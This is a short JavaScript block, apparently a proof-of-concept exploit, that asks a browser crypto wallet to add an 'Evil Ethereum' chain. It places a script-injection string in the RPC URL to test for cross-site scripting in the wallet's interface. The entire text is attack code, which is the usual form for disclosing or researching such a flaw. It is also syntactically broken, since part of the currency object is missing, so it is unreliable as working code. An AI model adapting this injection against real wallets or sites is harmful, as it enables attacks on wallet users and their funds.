  <script>
    async function exploit() {
      try {
        // Modern wallet provider (EIP-1193)
        const provider = window.ethereum || (window.web3 && window.web3.currentProvider);

        if (!provider || !provider.request) {
          alert("No wallet detected (window.ethereum not found)");
          return;
        }

        // Trigger wallet_addEthereumChain with malicious RPC URL
        await provider.request({
          method: "wallet_addEthereumChain",
          params: [{
            chainId: "0x31339", // Random chain ID
            chainName: "Evil Ethereum",
            rpcUrls: ['https://rpc-mumbai.matic.today/x"+prompt(document.domain)+"'], // XSS in RPC URL

              name: "Evil ETH",
              symbol: "EVIL",
              decimals: 18
            },
            blockExplorerUrls: ["https://explorer-mumbai.maticvigil.com"]
          }]
        });

        alert("wallet_addEthereumChain triggered successfully!");

      } catch (err) {
        alert("Request rejected or failed: " + (err.message || err));
        console.error(err);
      }
    }
  </script>
